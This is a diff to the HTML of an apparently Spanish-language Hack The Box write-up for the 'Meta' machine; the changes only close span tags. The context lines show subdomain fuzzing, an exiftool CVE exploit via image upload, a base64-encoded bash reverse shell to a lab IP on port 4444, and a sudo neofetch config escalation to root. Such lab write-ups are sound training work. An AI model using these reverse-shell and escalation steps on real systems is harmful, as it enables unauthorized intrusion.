@@ -27,9 +27,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="code-dark-blue">assets                  [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 49ms]</span>
 <span class="code-dark-blue">css                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 51ms]</span>
 <span class="code-dark-green">                        [Status: 200, Size: 4427, Words: 1663, Lines: 87, Duration: 74ms]</span>  
-<span class="code-dark-yellow">server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 83ms]
+<span class="code-dark-yellow">server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 83ms]</span>
 </code></pre></div><p>Nada interesante. Como hay un dominio llamado <code>artcorp.htb</code>, es probable que existan otros subdominios. Vamos a enumerar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.140/ -H <span class="code-dark-yellow">'Host: FUZZ.artcorp.htb'</span> -r -fl 87  
-<span class="code-dark-green">dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 59ms]
+<span class="code-dark-green">dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 59ms]</span>
 </code></pre></div><p>Genial, ahora podemos meter <code>dev01.artcorp.htb</code> en <code>/etc/hosts</code>. Esta es la página web:</p><p><img alt="Meta 2" src="/images/HTB/Meta/Meta-2.webp"></p><p><img alt="Meta 3" src="/images/HTB/Meta/Meta-3.webp"></p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Tenemos la posibilidad de subir imágenes. Y esta es la salida:</p><p><img alt="Meta 4" src="/images/HTB/Meta/Meta-4.webp"></p><h3 id="explotación-de-exiftool">Explotación de <code>exiftool</code></h3><p>Este resultado se parece mucho a la salida de <code>exiftool</code>. Existen algunos <a target="_blank" href="https://www.opencve.io/cve?vendor=exiftool_project">CVE relacionados con <code>exiftool</code></a>. De hecho, el que es explotable es <a target="_blank" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23935">CVE-2022-23935</a>, similar al explotado en <a target="_blank" href="../overflow#intrusi%c3%b3n-en-la-m%c3%a1quina">Overflow</a>. Entonces, vamos a reproducir los pasos (más información <a target="_blank" href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
 
@@ -75,7 +75,7 @@ www-data@meta:/$ stty rows 50 columns 158
 <span class="code-blue">CMD: UID=0    PID=22992  | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/*</span>
 <span class="code-blue">CMD: UID=0    PID=22991  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf</span>  
 <span class="code-blue">CMD: UID=0    PID=22993  | /bin/sh -c rm /tmp/*</span>
-<span class="code-magenta">CMD: UID=1000 PID=22994  | pkill mogrify
+<span class="code-magenta">CMD: UID=1000 PID=22994  | pkill mogrify</span>
 </code></pre></div><p>Vemos comandos interesantes:</p><ul><li><code>/bin/bash /usr/local/bin/convert_images.sh</code></li><li><code>cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf</code></li></ul><h2 id="movimiento-lateral-al-usuario-thomas">Movimiento lateral al usuario <code>thomas</code></h2><p>El segundo se ejecuta por el usuario <code>thomas</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls /home
 thomas
 www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -la /home/thomas
@@ -185,12 +185,12 @@ User thomas may run the following commands on meta:
 <span class="code-white">  ,g$$P"     """Y$$.".</span>        <span class="code-red">OS</span>: Debian GNU/Linux 10 (buster) x86_64  
 <span class="code-white"> ,$$P'              `$$$.</span>     <span class="code-red">Host</span>: VMware Virtual Platform None
 <span class="code-white">',$$P       ,ggs.     `$$b:</span>   <span class="code-red">Kernel</span>: 4.19.0-17-amd64
-<span class="code-white">`d$$'     ,$P"'   <span class="code-red">.<span class="code-white">    $$$</span>    <span class="code-red">Uptime</span>: 1 hour, 24 mins
-<span class="code-white"> $$P      d$'     <span class="code-red">,<span class="code-white">    $$P</span>    <span class="code-red">Packages</span>: 495 (dpkg)
-<span class="code-white"> $$:      $$.   <span class="code-red">-<span class="code-white">    ,d$$'</span>    <span class="code-red">Shell</span>: bash 5.0.3
+<span class="code-white">`d$$'     ,$P"'   <span class="code-red">.<span class="code-white">    $$$</span>    <span class="code-red">Uptime</span>: 1 hour, 24 mins</span></span>
+<span class="code-white"> $$P      d$'     <span class="code-red">,<span class="code-white">    $$P</span>    <span class="code-red">Packages</span>: 495 (dpkg)</span></span>
+<span class="code-white"> $$:      $$.   <span class="code-red">-<span class="code-white">    ,d$$'</span>    <span class="code-red">Shell</span>: bash 5.0.3</span></span>
 <span class="code-white"> $$;      Y$b._   _,d$P'</span>      <span class="code-red">Terminal</span>: script
-<span class="code-white"> Y$$.    <span class="code-red">`.<span class="code-white">`"Y$$$$P"'</span>         <span class="code-red">CPU</span>: AMD EPYC 7302P 16- (2) @ 2.994GHz
-<span class="code-white"> `$$b      <span class="code-red">"-.__</span>              <span class="code-red">GPU</span>: VMware SVGA II Adapter
+<span class="code-white"> Y$$.    <span class="code-red">`.<span class="code-white">`"Y$$$$P"'</span>         <span class="code-red">CPU</span>: AMD EPYC 7302P 16- (2) @ 2.994GHz</span></span>
+<span class="code-white"> `$$b      <span class="code-red">"-.__</span>              <span class="code-red">GPU</span>: VMware SVGA II Adapter</span>
 <span class="code-white">  `Y$$</span>                        <span class="code-red">Memory</span>: 139MiB / 1994MiB
 <span class="code-white">   `Y$$.</span>
 <span class="code-white">     `$$b.</span>                       <span class="code-bg-red">   </span><span class="code-bg-green">   </span><span class="code-bg-dark-yellow">   </span><span class="code-bg-dark-blue">   </span><span class="code-bg-magenta">   </span><span class="code-bg-cyan">   </span><span class="code-bg-white">   </span>
@@ -235,7 +235,7 @@ If the binary is allowed to run as superuser by <span class="code-cyan">sudo</sp
 
 <span class="code-cyan">TF=$(mktemp)</span>
 <span class="code-cyan">echo 'exec /bin/sh' &gt;$TF</span>
-<span class="code-cyan">sudo neofetch --config $TF
+<span class="code-cyan">sudo neofetch --config $TF</span>
 </code></pre></div><p>Y al ejecutar <code>neofetch</code> con <code>sudo</code>, obtenemos la <em>reverse shell</em> como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
 Ncat: Version 7.93 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
